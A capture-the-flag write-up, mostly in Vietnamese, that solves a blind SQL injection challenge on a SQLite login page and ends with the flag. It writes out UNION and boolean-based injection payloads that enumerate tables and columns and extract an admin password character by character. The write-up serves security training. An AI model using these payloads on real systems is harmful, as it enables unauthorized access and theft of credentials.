# Description:

Exploit blind sqli to get admin password, then login at "/login" to get flag. Password contains [a-z0-9_] and the column is upw

# Solutions:

= Thử với `'UNION SELECT 1,2,3-- -` thì trả về đã tồn tại:
<img width="921" height="393" alt="image" src="https://github.com/user-attachments/assets/41789fb2-ad83-46ae-bbe2-7f6515be694b" />

= Thử với `'UNION SELECT 1,2,3,4-- -` thì trả kết quả không đúng số cột:
<img width="929" height="305" alt="image" src="https://github.com/user-attachments/assets/7f666b75-ac43-4c86-a80d-ad6952b62a94" />

= Thử với `'UNION Select 1,2,sql FROM information_schema-- -` thì hiện kết quả:
<img width="909" height="297" alt="image" src="https://github.com/user-attachments/assets/fa7da424-7ea7-4f03-89bf-5995343f9de7" />

=> Không phải CSDL là MySQL, Oracle,.. . Thử với SQLite:

```
'UNION Select 1,2,sql FROM sqlite_master-- -
```

= Trả về kết quả:
<img width="838" height="131" alt="image" src="https://github.com/user-attachments/assets/5ec9c7d2-8156-4a1a-adab-f8401a756fbe" />

=> Sử dụng SQLite

= Thử `Boolean Based`:
<img width="767" height="227" alt="image" src="https://github.com/user-attachments/assets/2150f4c6-23e9-4b34-ad5b-e360312aee73" />

=> Đây là Boolean Based

`SELECT * FROM users WHERE uid='107' AND (SELECT length(upw) FROM users)-- ';` nên ta thấy db là users và bảng là uid

= Tính số bảng bằng cách thử từ 1 trở lên:

```
107' or ((SELECT count(*) FROM sqlite_master WHERE type='table')=1)--
```

=> CÓ 1 bảng thôi

= Tính độ dài tên của bảng:

```
107' or ((SELECT length(name) FROM sqlite_master WHERE type='table')=1)--
```

=> Trả về: `User 107' or ((SELECT length(name) FROM sqlite_master WHERE type='table')=1)-- not found!`

=> Độ dài khác, thử tiếp đến khi độ dài = 5 thì hiện thông báo `User 107' or ((SELECT length(name) FROM sqlite_master WHERE type='table')=5)-- exists`

= Tìm tên của bảng:

```
107’ AND (SELECT substr((SELECT name FROM sqlite_master WHERE type=‘table’),1,1)=‘a’) –
```

= Và trả về `User 107’ AND (SELECT substr((SELECT name FROM sqlite_master WHERE type=‘table’),1,1)=‘a’) – not found!`

= Thử các ký tự khác ở vị trí đầu rồi vị trí tiếp theo:

<img width="946" height="332" alt="image" src="https://github.com/user-attachments/assets/6c9f3955-41a3-45fe-a899-e23d813ba746" />

=> Tên bảng là `users`

= Tìm số cột và tên của từng cột:

```
admin’ AND ((SELECT count(*) FROM pragma_table_info(‘users’))=3) –
```

=> Có 3 cột.

= Kiểm tra tên từng cột:

```
admin’ AND (SELECT substr((SELECT name from pragma_table_info(‘users’)LIMIT 1 OFFSET 0),1,1)=’a’) –
admin’ AND (SELECT substr((SELECT name from pragma_table_info(‘users’)LIMIT 1 OFFSET 1),1,1)=’a’) –
admin’ AND (SELECT substr((SELECT name from pragma_table_info(‘users’)LIMIT 1 OFFSET 2),1,1)=’a’) –
```

=> Nhận được giá trị của 3 cột là idx uid và upw

=> Dự đoán là uid sẽ là cột chứa tên người dùng và upx là password. Ta sẽ dò giá trị password của tài khoản admin.

= Dò giá trị password của tài khoản `admin`:

<img width="1498" height="894" alt="image" src="https://github.com/user-attachments/assets/827cfbb2-b094-4909-b97a-ddb79869e11f" />

Thu được password như vậy

= Thu được flag là:

`
CHH{SImPle_B1IND_SQLi_33ebd3905ad054165900697c7b532b63}
`








